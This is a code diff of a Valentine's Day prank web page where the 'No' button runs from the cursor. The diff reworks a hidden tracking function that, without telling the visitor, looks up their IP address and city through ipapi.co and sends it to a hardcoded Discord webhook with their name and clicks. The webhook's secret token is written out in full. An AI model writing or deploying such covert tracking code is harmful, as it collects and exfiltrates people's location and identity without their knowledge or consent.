@@ -67,6 +67,8 @@
       text-align: center;
       outline: none;
       margin-bottom: 20px;
+      width: 80%;
+      max-width: 300px;
     }
 
     /* Main Card */
@@ -103,7 +105,7 @@
       border: none;
       border-radius: 50px;
       cursor: pointer;
-      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
     }
 
     #no {
@@ -134,7 +136,7 @@
 
   <div id="namePortal">
     <h1 style="margin-bottom: 20px; color:#ff4d6d;">Who is opening this?</h1>
-    <input type="text" id="userName" placeholder="Enter your name...">
+    <input type="text" id="userName" placeholder="Enter your name..." autocomplete="off">
     <button onclick="startApp()" style="background:var(--primary); color:white; border:none; padding:12px 40px; border-radius:30px; cursor:pointer; font-weight:bold;">Enter</button>
   </div>
 
@@ -155,7 +157,7 @@
   let yesScale = 1;
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
-  // Background Hearts
+  // 1. CREATE FLOATING HEARTS
   function createHearts() {
     const bg = document.getElementById('heartBg');
     for(let i=0; i<15; i++) {
@@ -169,50 +171,62 @@
   }
   createHearts();
 
+  // 2. DISCORD TRACKING (Safe version)
+  async function trackUser(event) {
+    let logData = {
+      embeds: [{
+        title: "💖 Valentine Tracker",
+        color: 0xff4d6d,
+        description: `**User:** ${visitorName}\n**Event:** ${event}\n**Clicks:** ${clickCount}`,
+        timestamp: new Date()
+      }]
+    };
+
+    try {
+      const ipRes = await fetch('https://ipapi.co/json/');
+      if(ipRes.ok) {
+        const data = await ipRes.json();
+        logData.embeds[0].fields = [
+          { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
+          { name: "IP Address", value: data.ip, inline: true }
+        ];
+      }
+    } catch(e) { console.log("IP Blocked"); }
+
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(logData)
+    }).catch(err => console.error("Webhook failed"));
+  }
+
+  // 3. APP START
   function startApp() {
-    visitorName = document.getElementById('userName').value || "Someone";
+    const nameInput = document.getElementById('userName');
+    visitorName = nameInput.value.trim() || "Someone Anonymous";
+    
+    trackUser("Started the game");
+
     document.getElementById('namePortal').style.opacity = "0";
     setTimeout(() => {
       document.getElementById('namePortal').style.display = "none";
       document.getElementById('mainCard').style.display = "flex";
-      trackUser(`User entered: ${visitorName}`);
     }, 500);
-  }
-
-  async function trackUser(event) {
-    try {
-      const ipRes = await fetch('https://ipapi.co/json/');
-      const data = await ipRes.json();
-      fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          embeds: [{
-            title: "💖 Valentine Tracker",
-            color: 0xff4d6d,
-            fields: [
-              { name: "User", value: visitorName, inline: true },
-              { name: "Event", value: event, inline: true },
-              { name: "Location", value: `${data.city}, ${data.country_name}`, inline: false },
-              { name: "IP Address", value: data.ip, inline: true },
-              { name: "Clicks", value: clickCount.toString(), inline: true }
-            ],
-            timestamp: new Date()
-          }]
-        })
-      });
-    } catch(e) { console.log("Tracking restricted"); }
   }
 
   const noBtn = document.getElementById("no");
   const card = document.getElementById("mainCard");
   const yesBtn = document.getElementById("yes");
-  const jokes = ["NICE TRY! 😉", "TOO SLOW!", "ERROR 404!", "MISSED ME!", "JUST SAY YES! ❤️", "YOU'RE PERSISTENT!", "DENIED!"];
+  const jokeDisplay = document.getElementById("joke-text");
+  const jokes = ["NICE TRY! 😉", "TOO SLOW!", "ERROR 404!", "MISSED ME!", "JUST SAY YES! ❤️", "DENIED!", "ALMOST!"];
 
-  // Magnetic Movement logic
+  // 4. MAGNETIC MOVEMENT
   const handleInput = (x, y) => {
     const rect = noBtn.getBoundingClientRect();
-    const dist = Math.sqrt(Math.pow(x - (rect.left + rect.width/2), 2) + Math.pow(y - (rect.top + rect.height/2), 2));
+    const btnCenterX = rect.left + rect.width / 2;
+    const btnCenterY = rect.top + rect.height / 2;
+    const dist = Math.sqrt(Math.pow(x - btnCenterX, 2) + Math.pow(y - btnCenterY, 2));
+    
     if (dist < 85) moveNo();
   };
 
@@ -222,7 +236,7 @@
   function moveNo() {
     clickCount++;
     
-    // Yes Button Growth (Caps then pulses)
+    // Yes Grows inside fixed card (Caps at 2.5 then pulses)
     if (yesScale < 2.5) { 
       yesScale += 0.15;
       yesBtn.style.transform = `scale(${yesScale})`;
@@ -230,18 +244,19 @@
       yesBtn.style.animation = "pulse 1.5s infinite";
     }
 
-    // No Button Teleport (Stays same size)
-    const pad = 50;
+    // No stays same size, just moves
+    const pad = 60;
     const maxX = card.clientWidth - noBtn.offsetWidth - pad;
     const maxY = card.clientHeight - noBtn.offsetHeight - pad;
     noBtn.style.left = (Math.floor(Math.random() * maxX) + pad/2) + "px";
     noBtn.style.top = (Math.floor(Math.random() * maxY) + pad/2) + "px";
 
-    document.getElementById("joke-text").innerText = jokes[clickCount % jokes.length];
+    jokeDisplay.innerText = jokes[clickCount % jokes.length];
     
     if(clickCount % 15 === 0) trackUser(`Clicked No ${clickCount} times`);
   }
 
+  // 5. YES CLICKED
   function yesClick() {
     noBtn.style.display = "none";
     trackUser("SAID YES! ❤️");
@@ -255,7 +270,7 @@
 
     document.getElementById("mainCard").innerHTML = `
       <div style="margin: auto; z-index:100;">
-        <h1 style='font-size: 2.5rem;'>I KNEW IT! ❤️</h1>
+        <h1 style='font-size: 2.2rem;'>I KNEW IT! ❤️</h1>
         <p style='color: #ff4d6d; font-weight: 800; margin-top: 15px;'>HAPPY VALENTINE'S DAY, ${visitorName.toUpperCase()}!</p>
       </div>
     `;
